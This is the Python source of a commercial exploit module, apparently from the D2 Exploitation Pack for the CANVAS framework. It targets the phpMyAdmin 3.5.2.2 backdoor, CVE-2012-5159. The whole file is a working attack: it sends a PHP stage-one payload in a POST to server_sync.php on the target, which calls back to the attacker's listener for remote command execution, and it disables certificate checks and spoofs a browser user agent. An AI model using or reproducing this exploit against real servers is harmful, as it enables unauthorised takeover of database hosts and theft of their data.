#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2012
#

import sys, time, os, re

sys.path.append(".")
sys.path.append("../../")

import canvasengine

from exploitutils import *
from ExploitTypes.phpexploit import *
import StringIO
import urllib

NAME = "d2sec_pma_backdoor.py"
VERSION = "0.1"
DESCRIPTION = "PhpMyAdmin Backdoor Arbitrary Command Execution"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux"], ["Windows"], ["Solaris"], ["AIX"], ["FreeBSD"], ["MacOSX"], ["HP-UX"] ]

DOCUMENTATION = {}
DOCUMENTATION["Versions Affected"] = "3.5.2.2"
DOCUMENTATION["Date public"] = "2012/09/25"
DOCUMENTATION["References"] = "http://www.phpmyadmin.net/home_page/security/PMASA-2012-5.php"
DOCUMENTATION["CVE Name"] = "CVE-2012-5159"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-5159"

class theexploit (tcpexploit):
    
  def __init__(self):
    tcpexploit.__init__(self)
    self.host = ''
    self.port = 80 
    self.uri = 'phpmyadmin'
    self.https = 0
    self.name = NAME
	
  def getargs(self):	
    self.host = self.target.interface
    self.port = int(self.argsDict.get("port",self.port))
    self.uri = self.argsDict.get("uri",self.uri)
    self.https = int(self.argsDict.get("https",self.https))

  def neededListenerTypes(self):
    return [canvasengine.PHPMULTI]

  def get_php_to_mosdef(self):
    localhost = self.callback.ip
    localport = self.callback.port
    self.log('[D2] Using PHPMULTI callback of %s:%d' % (localhost,localport))
    badchars = '' 
    return get_php_stage1(badchars, localhost, localport)

  def run(self):
    self.getargs()
    self.setInfo('[D2] %s attacking %s:%d' % (NAME,self.host,self.port))
    cmd = self.get_php_to_mosdef()
    cmd = urllib.quote_plus(cmd)
    content = StringIO.StringIO()
    try:
      import pycurl
    except Exception, e:
      self.log('[D2] %s' % e)
      self.log('[D2] Install module python-pycurl')
      return ''
    try:
      proto = 'http'
      c = pycurl.Curl()
      if self.https:
        proto = 'https'
      c.setopt(pycurl.URL, '%s://%s/%s/server_sync.php' % (proto, self.host, self.uri))
      c.setopt(c.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
      c.setopt(pycurl.POSTFIELDS, 'c=%s' % cmd)
      c.setopt(pycurl.POST, 1)
      c.setopt(c.WRITEFUNCTION, content.write)
      c.setopt(c.TIMEOUT, 15)
      if self.https:
        c.setopt(c.SSL_VERIFYPEER, 0)
        c.setopt(c.SSL_VERIFYHOST, 0)
      c.perform()
      c.close()
    except Exception, e:
      self.log('[D2] %s' % e)
      return 1
    data = content.getvalue()
    content.close()
    self.setInfo('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
    return 1

  def usage(self):
    print "Usage: "+sys.argv[0]+" -t target [-p port:80] -O https:[0|1] -O uri:<path>" 
    sys.exit(0)
    
if __name__ == '__main__':
  print "Running CANVAS %s v %s" % (NAME,VERSION)
  app = theexploit()
  ret = standard_callback_commandline(app)
